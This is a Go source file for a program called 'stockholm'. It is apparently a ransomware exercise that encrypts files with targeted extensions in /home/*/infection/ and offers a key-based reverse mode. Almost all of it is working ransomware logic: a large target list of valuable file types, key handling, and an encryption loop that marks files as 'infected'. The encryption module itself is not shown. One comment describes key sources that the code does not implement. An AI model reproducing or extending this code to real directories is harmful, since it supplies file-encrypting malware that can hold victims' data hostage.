package main

import (
	"fmt"
	"os"
	"errors"
	"path/filepath"
	"crypto/sha256"

	"stockholm/crypt"
)
var TargetedExtensions = map[string]bool{
	".der": true, ".pfx": true, ".key": true, ".crt": true, ".csr": true, ".p12": true, ".pem": true, ".odt": true, ".ott": true, ".sxw": true, ".stw": true, ".uot": true, ".3ds": true, ".max": true, ".3dm": true, ".ods": true, ".ots": true, ".sxc": true, ".stc": true, ".dif": true, ".slk": true, ".wb2": true, ".odp": true, ".otp": true, ".sxd": true, ".std": true, 
	".uop": true, ".odg": true, ".otg": true, ".sxm": true, ".mml": true, ".lay": true, ".lay6": true, ".asc": true, ".sqlite3": true, ".sqlitedb": true, ".sql": true, ".accdb": true, ".mdb": true, ".db": true, ".dbf": true, ".odb": true, ".frm": true, ".myd": true, ".myi": true, ".ibd": true, ".mdf": true, ".ldf": true, ".sln": true, ".suo": true, ".cs": true, 
	".c": true, ".cpp": true, ".pas": true, ".h": true, ".asm": true, ".js": true, ".cmd": true, ".bat": true, ".ps1": true, ".vbs": true, ".vb": true, ".pl": true, ".dip": true, ".dch": true, ".sch": true, ".brd": true, ".jsp": true, ".php": true, ".asp": true, ".rb": true, ".java": true, ".jar": true, ".class": true, ".sh": true, ".mp3": true, ".wav": true, ".swf": true,
	".fla": true, ".wmv": true, ".mpg": true, ".vob": true, ".mpeg": true, ".asf": true, ".avi": true, ".mov": true, ".mp4": true, ".3gp": true, ".mkv": true, ".3g2": true, ".flv": true, ".wma": true, ".mid": true, ".m3u": true, ".m4u": true, ".djvu": true, ".svg": true, ".ai": true, ".psd": true, ".nef": true, ".tiff": true, ".tif": true, ".cgm": true, ".raw": true,
	".gif": true, ".png": true, ".bmp": true, ".jpg": true, ".jpeg": true, ".vcd": true, ".iso": true, ".backup": true, ".zip": true, ".rar": true, ".7z": true, ".gz": true, ".tgz": true, ".tar": true, ".bak": true, ".tbk": true, ".bz2": true, ".PAQ": true, ".ARC": true, ".aes": true, ".gpg": true, ".vmx": true, ".vmdk": true, ".vdi": true, ".sldm": true, ".sldx": true,
	".sti": true, ".sxi": true, ".602": true, ".hwp": true, ".snt": true, ".onetoc2": true, ".dwg": true, ".pdf": true, ".wk1": true, ".wks": true, ".123": true, ".rtf": true, ".csv": true, ".txt": true, ".vsdx": true, ".vsd": true, ".edb": true, ".eml": true, ".msg": true, ".ost": true, ".pst": true, ".potm": true, ".potx": true, ".ppam": true, ".ppsx": true,
	".ppsm": true, ".pps": true, ".pot": true, ".pptm": true, ".pptx": true, ".ppt": true, ".xltm": true, ".xltx": true, ".xlc": true, ".xlm": true, ".xlt": true, ".xlw": true, ".xlsb": true, ".xlsm": true, ".xlsx": true, ".xls": true, ".dotx": true, ".dotm": true, ".dot": true, ".docm": true, ".docb": true, ".docx": true, ".doc": true,
}

type StockholmOptions struct {
	key []byte 
	silent bool
	reverse bool
}

func ErrorExit(err error) {
	fmt.Println(err)
	os.Exit(1)
}

func hasFlag(args []string, flags ...string) bool {
	for _, arg := range args {
		for _, f := range flags {
			if arg == f {
				return true
			}
		}
	}
	return false
}

func getInfoFlags(argList []string) () {
	if hasFlag(argList, "-h", "--help") {
		fmt.Println("Stockholm help:")
		fmt.Println("-h, --help: Show this help menu")
		fmt.Println("-v, --version: Get version number")
		fmt.Println("-r, --reverse: Reverse the encryption on .ft files")
		fmt.Println("-s, --silent: Silences output during encryption or decryption")
		fmt.Println("Infection: ")
		fmt.Println("./stockholm [key]")
		fmt.Println("Reverse: ")
		fmt.Println("./stockholm --reverse [key]")
		os.Exit(0)
	}
	if hasFlag(argList, "-v", "--version") {
		fmt.Println("stockholm version 0.1.1")
		os.Exit(0)
	}
}

func getKeyValue(argList []string) ([]byte, error) {
	argc := len(argList)
	key_value := ""
	if argc >= 2 {
		key_value = argList[1]
		for index, value := range(argList) {
			if value == "-r" && index + 1 < argc {
				key_value = argList[index + 1]
			}
		}
	}

	if key_value == "" {
		return nil, errors.New("Error: Could not find key value")
	}
	if len(key_value) < 16 {
		return nil, errors.New(fmt.Sprintf("Error: Invalid key value [%s]", key_value))
	}
	hash := sha256.Sum256([]byte(key_value))
	return hash[:], nil
}

// We try to get the key in 3 ways: first from argv then from env then finally the builtin fallback
func parser(argList []string) (*StockholmOptions, error) {
	getInfoFlags(argList)
	ret := StockholmOptions{
		key: []byte(""),
		silent: false,
		reverse: false,
	}

	if hasFlag(argList, "-r", "--reverse") {
		ret.reverse = true
	}

	key, err := getKeyValue(argList)
	if err != nil {
		return nil, err
	}
	ret.key = key

	if hasFlag(argList, "-s", "--silent") {
		ret.silent = true
	}
	return &ret, nil
}

// We take all the file for the infection, they will be matched against TargetedExtensions later. For reverse, we retrieve only the .ft files
func getInfectionFiles(reverse bool) ([]string, error) {
	pattern := "/home/*/infection/*"
	if reverse {
		pattern = "/home/*/infection/*.ft"
	}
	matches, _ := filepath.Glob(pattern)
	return matches, nil
}

func reverseInfection(opts *StockholmOptions) {
	files, err := getInfectionFiles(opts.reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		err = crypt.DecryptFile(opts.key, file)
		if err != nil {
			if !opts.silent {
				fmt.Println(err)
			}
			continue
		}
		if !opts.silent {
			fmt.Printf("[%s] infection reversed\n", file)
		}
	}
}

func runInfection(opts *StockholmOptions) {
	files, err := getInfectionFiles(opts.reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		ext := filepath.Ext(file)
		if TargetedExtensions[ext] { 
			err = crypt.EncryptFile(opts.key, file)
			if err != nil {
				fmt.Println(err)
				continue
			}
			if !opts.silent {
				fmt.Printf("[%s] infected\n", file)
			}
		}
	}
}

func main() {
	opts, err := parser(os.Args)
	if err != nil {
		ErrorExit(err)
	}
	if opts.reverse == true {
		reverseInfection(opts)
	} else {
		runInfection(opts)
	}
	os.Exit(0)
}
